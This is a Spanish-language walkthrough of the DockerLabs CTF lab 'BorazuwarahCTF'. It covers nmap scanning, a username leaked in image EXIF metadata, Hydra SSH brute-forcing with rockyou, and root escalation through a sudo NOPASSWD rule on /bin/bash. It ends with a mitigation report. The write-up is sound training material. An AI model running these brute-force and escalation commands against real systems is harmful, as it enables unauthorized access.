# BorazuwarahCTF

> Usuario oculto en los metadatos de una imagen (Exiftool), fuerza bruta SSH con Hydra y escalada a root por un sudo mal configurado.

| | |
|---|---|
| **Plataforma** | DockerLabs |
| **Dificultad** | Muy fácil |
| **Objetivo** | `172.17.0.2` |
| **Servicios** | 22/tcp (SSH), 80/tcp (HTTP) |
| **Saltos de usuario** | 2 |

**Tags:** `Esteganografía` · `Exiftool` · `Hydra` · `sudo NOPASSWD`

---

## Reconocimiento

```bash
$ sudo nmap -sCV -sS -n -Pn -p- 172.17.0.2
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1
80/tcp open  http    Apache httpd 2.4.59
```

La web del 80 solo muestra una imagen de un huevo Kinder Sorpresa. Huele a esteganografía.

## Enumeración web y esteganografía

Gobuster no encuentra recursos, así que descargo la imagen y miro sus metadatos con Exiftool.

```bash
$ exiftool huevo.jpeg
...
Description : User: borazuwarah
...
```

Los metadatos filtran un usuario: **borazuwarah**.

## Explotación · fuerza bruta

```bash
$ hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
[22][ssh] host: 172.17.0.2   login: borazuwarah   password: 123456
```

Con **borazuwarah : 123456** entro por SSH.

```bash
$ ssh borazuwarah@172.17.0.2
borazuwarah@bdff3a8acd18:~$
```

## Escalada a root · sudo NOPASSWD

```bash
$ sudo -l
User borazuwarah may run the following commands on bdff3a8acd18:
    (ALL) NOPASSWD: /bin/bash
```

Poder ejecutar `/bin/bash` como cualquier usuario sin contraseña es un shell de root servido en bandeja.

```bash
$ sudo -u root /bin/bash
# whoami
root
```

Máquina BorazuwarahCTF completada: `uid=0(root)`.

---

## Informe · vulnerabilidades y mitigaciones

### 🔴 CRÍTICA — Escalada a root por sudo NOPASSWD sobre /bin/bash

`CWE-250` · A05:2021 – Security Misconfiguration

**Impacto.** Poder ejecutar /bin/bash como cualquier usuario sin contraseña es una shell de root directa.

**Mitigación.** Eliminar esa regla de sudoers; conceder solo comandos concretos y necesarios.

### 🟠 ALTA — Contraseña débil susceptible a fuerza bruta

`CWE-521` · A07:2021 – Identification and Authentication Failures

**Impacto.** La cuenta usa una contraseña trivial (123456), accesible por SSH mediante fuerza bruta.

**Mitigación.** Contraseñas robustas, bloqueo de intentos (fail2ban) y autenticación por clave.

### 🟡 MEDIA — Información sensible en los metadatos de una imagen

`CWE-200` · A05:2021 – Security Misconfiguration

**Impacto.** Los metadatos EXIF de la imagen publicada filtran un nombre de usuario válido (borazuwarah).

**Mitigación.** Limpiar los metadatos de los ficheros antes de publicarlos (p. ej. exiftool -all=).

---

_Writeup de **BorazuwarahCTF** · DockerLabs · por [ak1t4](https://github.com/ak1ta4)_
